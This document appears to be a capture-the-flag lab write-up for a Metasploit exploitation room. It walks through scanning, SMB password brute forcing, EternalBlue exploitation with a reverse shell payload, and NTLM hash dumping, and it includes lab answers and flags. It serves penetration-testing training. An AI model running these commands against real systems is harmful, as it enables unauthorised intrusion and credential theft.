## Metasploit - Exploitation

Here we will learn how to use Metasploit for vulnerability scanning and exploitation.  
We will also cover how the database feature makes it easier to manage penetration testing engagements with a broader scope.  
Finally, we will look at generating payloads with msfvenom and how to start a Meterpreter session on most target platforms.

---

Topics we will cover:
- How to scan target systems using Metasploit
- How to use the Metasploit database feature
- How to use Metasploit to conduct a vulnerability scan
- How to use Metasploit to exploit vulnerable services on target systems
- How msfvenom can be used to create payloads and obtain a Meterpreter session on the target system

---

### üîπ Scanning

#### Port Scanning

Metasploit has a number of modules to scan open ports on the target system and network.  
List potential port scanning modules:

```bash
msf6 > search portscan
````

Output:

```
Matching Modules
================
0  auxiliary/scanner/http/wordpress_pingback_access
1  auxiliary/scanner/natpmp/natpmp_portscan
2  auxiliary/scanner/portscan/ack
3  auxiliary/scanner/portscan/ftpbounce
4  auxiliary/scanner/portscan/syn
5  auxiliary/scanner/portscan/tcp
6  auxiliary/scanner/portscan/xmas
7  auxiliary/scanner/sap/sap_router_portscanner
```

Interact with module by index or name:

```bash
use 7
# OR
use auxiliary/scanner/sap/sap_router_portscanner
```

Show module options:

```bash
msf6 auxiliary(scanner/portscan/tcp) > show options
```

Important options:

* **CONCURRENCY** ‚Üí number of simultaneous connections per host
* **PORTS** ‚Üí port range (Metasploit scans 1‚Äì10000; Nmap default scans most common 1000 ports)
* **RHOSTS** ‚Üí target(s)
* **THREADS** ‚Üí concurrency across hosts

Alternative: Run **Nmap directly from Metasploit**:

```bash
msf6 > nmap -sS 10.10.12.229
```

Output (abbreviated):

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
```


#### UDP Service Identification

```bash
use auxiliary/scanner/discovery/udp_sweep
run
```

Output:

```
[*] Discovered NetBIOS on 10.10.12.229:137 (JON-PC::U :WORKGROUP::G :...)
```


#### SMB Scans

Example: Enumerate SMB version:

```bash
use auxiliary/scanner/smb/smb_version
run
```

Output:

```
[+] 10.10.12.229:445 - Host is running Windows 7 Professional SP1 (build:7601)
```


**Q. How many ports are open on the target system? ‚Üí 5**

Command:

```bash
nmap -sS Target_IP
```

Output:

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
8080/tcp open  sql
```

Why `-sS`?

* Stealth scan, sends SYN packets
* Faster and less logged compared to `-sT`

**Alternative (Metasploit way):**

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS MACHINE_IP
run
```


**Q. Using the relevant scanner, what NetBIOS name can you see? ‚Üí ACME IT SUPPORT**

Commands:

```bash
msfconsole
search netbios
use auxiliary/scanner/netbios/nbname
set RHOSTS MACHINE_IP
run
```


**Q. What is running on port 8000? ‚Üí WEBFS/1.21**

Commands:

```bash
use auxiliary/scanner/http/http_version
set RHOSTS MACHINE_IP
set RPORT 8000
run
```

Output:

```
[*] MACHINE_IP:8000 WEBFS/1.21
```


**Q. What is the ‚Äúpenny‚Äù user‚Äôs SMB password? ‚Üí leo1234**

Commands:

```bash
msfconsole
search smb_login
use 0
show options
set RHOSTS MACHINE_IP
set SMBUser penny
set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
run
```

Output:

```
[+] MACHINE_IP:445 - Success: 'penny:leo1234'
```

---

### üîπ Vulnerability Scanning

Metasploit can identify "low-hanging fruit" vulnerabilities.
Example: **VNC login scanner**

```bash
use auxiliary/scanner/vnc/vnc_login
info
```

Output shows supported options, password files, RHOSTS, etc.
This module tests VNC servers for weak/blank passwords.


**Q. Who wrote the module that allows us to check SMTP servers for open relay?**

Commands:

```bash
msfconsole
search smtp_relay
use auxiliary/scanner/smtp/smtp_relay
info
```

---

### üîπ Exploitation

Metasploit v5 details:

```
=[ metasploit v5.0.101-dev]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post]
+ -- --=[ 562 payloads - 45 encoders - 10 nops]
+ -- --=[ 7 evasion]
```

Show payloads for EternalBlue:

```bash
use exploit/windows/smb/ms17_010_eternalblue
show payloads
```

Select payload:

```bash
set payload generic/shell_reverse_tcp
show options
```

Important:

* **LHOST** ‚Üí attacker IP
* **LPORT** ‚Üí port to listen on

Run exploit:

```bash
set lhost 10.10.186.44
set rhosts <TARGET_IP>
exploit
```

Output ‚Üí successful exploitation with Windows shell opened.


#### Working with Sessions

Background a session:

```
CTRL+Z
Background session 1? [y/N] y
```

List sessions:

```bash
sessions
```

Interact with session:

```bash
sessions -i 1
```

---

### üîπ Questions and Exploits

**Q. What is the content of the flag.txt file? ‚Üí THM-5455554845**

Steps:

```bash
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set rhosts <TARGET_IP>
set lhost <YOUR_IP>
exploit
```

Navigate to flag:

```bash
dir
cd C:\Users
dir
cd <USERNAME>\Desktop
dir
type flag.txt
```


**Q. What is the NTLM hash of the password of the user "pirate"?**

Commands:

```bash
msfconsole
use post/windows/gather/hashdump
set SESSION 1
run
```

Output will dump hashes ‚Üí locate the `pirate` user hash.

